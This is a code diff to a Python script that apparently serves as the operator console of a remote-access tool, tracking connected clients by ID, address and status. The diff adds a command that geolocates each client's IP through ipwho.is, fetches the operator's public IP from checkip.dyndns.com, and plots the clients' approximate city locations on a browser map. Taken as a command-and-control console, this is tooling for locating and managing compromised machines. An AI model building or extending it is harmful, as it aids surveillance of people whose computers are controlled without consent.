@@ -8,6 +8,11 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import subprocess
 import tabulate
 import random
+import requests
+from urllib.request import urlopen
+import folium
+import webbrowser
+import re as r
 
 SEPARATOR = "<sep>"  # For separating filename and filesize
 HelpList = ["This is a List of all available commands", "===================Description====================\n",
@@ -120,6 +125,66 @@ class Client:
             return f"Client ID : {self.client_id} : ACTIVE for {connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(connection_duration)} ago)]"
         else:
             return f"Client ID : {self.client_id} : INACTIVE for {last_connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(last_connection_duration)} ago), last active at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.last_active_time))} ({FormatTime(connection_duration - last_connection_duration)} ago)]"
+
+
+# Mapping
+def MapConnections(connections):
+    map_object = folium.Map(location=[20, 0], zoom_start=2, tiles="CartoDB dark_matter")
+
+    for connection in connections:
+        ip = connection.client_address[0]
+        if ip != "127.0.0.1" and ip != "0.0.0.0":
+            pass
+        else:
+            ip = str(getIP())
+
+        try:
+            response = requests.get(f'https://ipwho.is/{ip}', timeout=5)
+            data = response.json()
+            if not data.get("success"):
+                print(f"[!] Failed to locate IP: {ip}")
+                continue
+            else:
+                print(f"[+] IP: {ip} - City: {data["city"]}")
+
+
+            lat = data["latitude"]
+            lon = data["longitude"]
+            city = data.get("city", "Unknown")
+            country = data.get("country", "")
+            status = connection.GetStatus()
+
+            popup_html = f"""
+                <b>Client ID:</b> {connection.client_id}<br>
+                <b>Status:</b> {status}<br>
+                <b>IP:</b> {ip}<br>
+                <b>Location:</b> {city}, {country}
+            """
+
+            # Add a circle to represent the approximate city area
+            folium.Circle(
+                location=[lat, lon],
+                radius=8000,  # ~8km radius
+                color='darkred',
+                fill=True,
+                fill_opacity=0.25,
+                popup=f"Approx. location: {city}"
+            ).add_to(map_object)
+
+            # Add the actual pin for the client
+            folium.Marker(
+                location=[lat, lon],
+                popup=folium.Popup(popup_html, max_width=300),
+                tooltip=f"Client {connection.client_id} ({status})",
+                icon=folium.Icon(color="red" if status == "ACTIVE" else "red", icon="user")
+            ).add_to(map_object)
+
+        except Exception as e:
+            print(f"[!] Error mapping IP {ip}: {e}")
+
+    map_object.save("clients_map.html")
+    print("[*] Map saved as clients_map.html")
+
 # Formating
 def TimeStamp():
     return f"[{time.strftime('%H:%M:%S', time.localtime())}]"
@@ -196,7 +261,10 @@ def stop_file_server():
     global server_running
     server_running = False
     print("[*] Stopping file-server...")
+def getIP():
+    d = str(urlopen('http://checkip.dyndns.com/').read())
 
+    return r.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
 
 def __str__(clients):
     if len(clients) == 0:
@@ -341,6 +409,15 @@ while True:
         elif SplitedCMD[1].lower() == "inactive":
             print(f"{TimeStamp()} Clearing inactive connections...")
             RemoveInactiveClients()
+    if SplitedCMD[0].lower() == "map":
+        if SplitedCMD[1].lower() == "connections":
+            print(f"{TimeStamp()} Mapping connections...")
+            MapConnections(clients)
+            try:
+                webbrowser.open('clients_map.html')
+                print("[*] Map opened in web browser.")
+            except FileNotFoundError:
+                print("[!] Map file not found.")
     if SplitedCMD[0].lower() == "connect":
         local_client_ID = int(SplitedCMD[1])
         if local_client_ID >= len(clients) or local_client_ID < 0:
